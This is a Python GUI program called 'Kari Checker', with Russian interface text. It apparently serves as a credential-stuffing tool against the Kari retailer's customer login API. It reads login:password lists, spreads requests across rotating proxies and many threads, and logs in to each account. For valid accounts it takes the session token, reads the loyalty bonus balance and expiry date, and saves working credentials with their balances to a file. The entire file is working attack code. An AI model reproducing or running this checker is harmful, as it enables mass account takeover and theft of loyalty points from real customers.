import tkinter as tk
from tkinter import filedialog, messagebox
import threading
import requests
import random
import datetime
from concurrent.futures import ThreadPoolExecutor
from tkinter import ttk

accounts = []
proxies = []
use_proxies = False
save_log_enabled = False
skip_zero_balance = False

valid_count = 0
invalid_count = 0
zero_balance_count = 0
processed_count = 0

lock = threading.Lock()
log_file = None
valid_output_file = None

# 📄 Запись в лог-файл
def write_log(message):
    if save_log_enabled and log_file:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(message + "\n")

# 💾 Сохраняем валидный аккаунт
def save_valid_account(data):
    with open(valid_output_file, "a", encoding="utf-8") as f:
        f.write(data + "\n")

# 🧪 Проверка одного аккаунта
def check_account(account):
    global valid_count, invalid_count, zero_balance_count, processed_count

    max_retries = 3
    attempt = 0
    while attempt < max_retries:
        try:
            login, password = account.strip().split(":")
            proxy_dict = None

            if login.isdigit() and not login.startswith("+"):
                login = "+" + login

            if use_proxies and proxies:
                proxy = random.choice(proxies).strip()
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}",
                }

            s = requests.Session()
            s.get("https://kari.com/auth/", proxies=proxy_dict, timeout=10)

            url = "https://i.api.kari.com/ecommerce/client/login"
            payload = {"login": login, "password": password}

            response = s.post(url, json=payload, proxies=proxy_dict, timeout=10)

            log_message = (
                f"\n📤 REQUEST: {login}:{password}\n"
                f"➡️ POST {url}\n"
                f"➡️ BODY: {payload}\n\n"
                f"📥 RESPONSE:\n"
                f"✅ Status: {response.status_code}\n"
                f"✅ Text: {response.text.strip()}\n"
                f"{'-'*60}"
            )

            if response.status_code == 200 and response.text.strip().lower() == "ok":
                kari_token = s.cookies.get("KariToken")
                if not kari_token:
                    raise Exception("Token not found")

                headers = {"Authorization": f"Bearer {kari_token}"}
                balance_url = "https://i.api.kari.com/cloud/eshop/clients/kariclub/balance?withMarkedBonuses=true"
                balance_resp = s.get(balance_url, headers=headers, proxies=proxy_dict, timeout=10)

                if balance_resp.status_code == 200:
                    balance_data = balance_resp.json()
                    data = balance_data.get("data", {})
                    marked_bonuses = balance_data.get("markedBonuses", [])
                    active_points = data.get("activePoints", 0)
                    expiration_date = None

                    if marked_bonuses and isinstance(marked_bonuses, list):
                        expiration_date = marked_bonuses[0].get("expirationDate")

                    if skip_zero_balance and active_points == 0:
                        with lock:
                            zero_balance_count += 1
                            invalid_count += 1
                        write_log(f"{log_message}\n🥶 Пропущен (0 бонусов): {login}:{password}")
                        break

                    valid_entry = (
                        f"✅ Аккаунт: {login}:{password}\n"
                        f"💰 Бонусы: {active_points}\n"
                    )
                    if expiration_date:
                        valid_entry += f"📅 Сгорают: {expiration_date}\n"
                    valid_entry += "------------------------------"

                    with lock:
                        valid_count += 1
                        save_valid_account(valid_entry)
                        write_log(f"{log_message}\n🎉 VALID: {login}:{password} | Бонусы: {active_points}")
                    break
                else:
                    raise Exception(f"Ошибка баланса: {balance_resp.status_code}")
            else:
                raise Exception(f"Невалидный аккаунт")
        except Exception as e:
            attempt += 1
            if attempt < max_retries:
                write_log(f"⚠️ Ошибка при проверке {account} → {str(e)}. Попытка {attempt}/{max_retries}")
            else:
                with lock:
                    invalid_count += 1
                write_log(f"❌ FAILED after retries: {account} → {str(e)}")
        finally:
            with lock:
                processed_count += 1
            update_gui()

# 📂 Выбор аккаунтов
def select_accounts_file():
    path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
    if path:
        with open(path, "r", encoding="utf-8") as f:
            content = f.read().splitlines()
        accounts.clear()
        accounts.extend(content)
        accounts_label.config(text=f"Загружено аккаунтов: {len(accounts)}")
        progress_bar["maximum"] = len(accounts)
        progress_bar["value"] = 0

# 📂 Выбор прокси
def select_proxies_file():
    path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
    if path:
        with open(path, "r", encoding="utf-8") as f:
            content = f.read().splitlines()
        proxies.clear()
        proxies.extend(content)
        proxies_label.config(text=f"Загружено прокси: {len(proxies)}")

# 🌐 Загрузка прокси по ссылке
def load_proxies_from_url():
    def download():
        url = url_entry.get().strip()
        if not url.startswith("http"):
            messagebox.showerror("Ошибка", "Введите корректную ссылку (http...)")
            return
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                new_proxies = resp.text.strip().splitlines()
                with lock:
                    proxies.clear()
                    proxies.extend([p.strip() for p in new_proxies if p.strip()])
                proxies_label.config(text=f"Загружено прокси: {len(proxies)}")
                top.destroy()
            else:
                messagebox.showerror("Ошибка", f"Ошибка загрузки. Код: {resp.status_code}")
        except Exception as e:
            messagebox.showerror("Ошибка", str(e))

    top = tk.Toplevel(root)
    top.title("Загрузка прокси по ссылке")
    top.configure(bg="#1e1e1e")
    tk.Label(top, text="Вставьте ссылку:", bg="#1e1e1e", fg="white").pack(pady=5)
    url_entry = tk.Entry(top, width=60)
    url_entry.pack(pady=5)
    tk.Button(top, text="Загрузить", command=download, bg="#2e2e2e", fg="white").pack(pady=10)

# 🔄 Обновление GUI
def update_gui():
    root.after(0, lambda: valid_label.config(text=f"✅ Валидных: {valid_count}"))
    root.after(0, lambda: invalid_label.config(text=f"❌ Невалидных: {invalid_count}"))
    root.after(0, lambda: zero_balance_label.config(text=f"🥶 С 0 бонусами: {zero_balance_count}"))
    root.after(0, lambda: progress_bar.config(value=processed_count))

# 🚀 Запуск проверки
def run_checker():
    global use_proxies, save_log_enabled, skip_zero_balance
    global valid_count, invalid_count, zero_balance_count, processed_count
    global log_file, valid_output_file

    valid_count = invalid_count = zero_balance_count = processed_count = 0
    update_gui()

    use_proxies = proxy_var.get()
    save_log_enabled = save_log_var.get()
    skip_zero_balance = skip_zero_var.get()
    threads = thread_slider.get()

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    log_file = f"log_{timestamp}.txt" if save_log_enabled else None
    valid_output_file = f"valid_{timestamp}.txt"

    write_log(f"🔄 Начало проверки ({threads} потоков)")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        for account in accounts:
            executor.submit(check_account, account)

# ▶️ Кнопка старт
def start_check():
    if not accounts:
        messagebox.showerror("Ошибка", "Сначала выберите файл с аккаунтами.")
        return
    threading.Thread(target=run_checker, daemon=True).start()

# ========== 🖥️ UI ==========
root = tk.Tk()
root.title("Kari Checker")
root.geometry("500x570")
root.configure(bg="#1e1e1e")

style_opts = {"bg": "#1e1e1e", "fg": "#ffffff", "font": ("Arial", 10)}
button_opts = {"bg": "#2e2e2e", "fg": "white", "activebackground": "#3e3e3e"}

tk.Label(root, text="🧪 Kari Checker", font=("Arial", 14, "bold"), bg="#1e1e1e", fg="white").pack(pady=10)

tk.Button(root, text="📂 Выбрать аккаунты", command=select_accounts_file, **button_opts).pack(pady=5)
accounts_label = tk.Label(root, text="Загружено аккаунтов: 0", **style_opts)
accounts_label.pack()

proxy_var = tk.BooleanVar()
tk.Checkbutton(root, text="🛡 Использовать прокси", variable=proxy_var, **style_opts, selectcolor="#1e1e1e").pack(pady=5)

tk.Button(root, text="📂 Выбрать файл прокси", command=select_proxies_file, **button_opts).pack(pady=5)
tk.Button(root, text="🌐 Загрузить прокси по ссылке", command=load_proxies_from_url, **button_opts).pack(pady=5)
proxies_label = tk.Label(root, text="Загружено прокси: 0", **style_opts)
proxies_label.pack()

save_log_var = tk.BooleanVar()
tk.Checkbutton(root, text="💾 Сохранять лог", variable=save_log_var, **style_opts, selectcolor="#1e1e1e").pack(pady=5)

skip_zero_var = tk.BooleanVar()
tk.Checkbutton(root, text="🥶 Не сохранять с 0 бонусами", variable=skip_zero_var, **style_opts, selectcolor="#1e1e1e").pack(pady=5)

tk.Label(root, text="🔁 Кол-во потоков:", **style_opts).pack(pady=5)
thread_slider = tk.Scale(root, from_=1, to=20, orient=tk.HORIZONTAL, bg="#2e2e2e", fg="white", highlightbackground="#1e1e1e")
thread_slider.set(5)
thread_slider.pack()

tk.Button(root, text="🚀 Старт", command=start_check, **button_opts).pack(pady=10)

progress_bar = ttk.Progressbar(root, length=400, mode="determinate")
progress_bar.pack(pady=10)

valid_label = tk.Label(root, text="✅ Валидных: 0", **style_opts)
valid_label.pack()

invalid_label = tk.Label(root, text="❌ Невалидных: 0", **style_opts)
invalid_label.pack()

zero_balance_label = tk.Label(root, text="🥶 С 0 бонусами: 0", **style_opts)
zero_balance_label.pack()

tk.Label(root, text="by @yourname", font=("Arial", 8), bg="#1e1e1e", fg="#555555").pack(side="bottom", pady=5)

root.mainloop()
